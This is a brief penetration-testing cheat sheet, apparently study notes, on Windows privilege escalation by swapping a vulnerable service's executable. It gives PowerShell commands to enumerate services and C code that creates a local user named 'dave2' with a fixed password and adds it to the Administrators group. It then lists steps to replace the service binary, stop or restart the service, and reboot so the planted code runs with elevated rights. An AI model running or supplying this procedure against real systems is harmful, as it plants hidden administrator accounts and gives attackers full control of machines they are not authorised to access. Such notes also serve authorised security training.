#### Leveraging Windows Services
Get a list of running services:
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}


Create an exe by cross compiling with mingw 
The following C code will create an administrator user:
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}

Replace the vulnerable service exe with the crafted exe and reboot or restart the service:

whoami /priv

net stop mysql (try to stop the service. if access is denied, reboot)

Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'} (try to see if the service is set to ‘auto’, then it will restart after a reboot.)

shutdown /r

PowerUp will add the ability to scan for this exploit automatically.


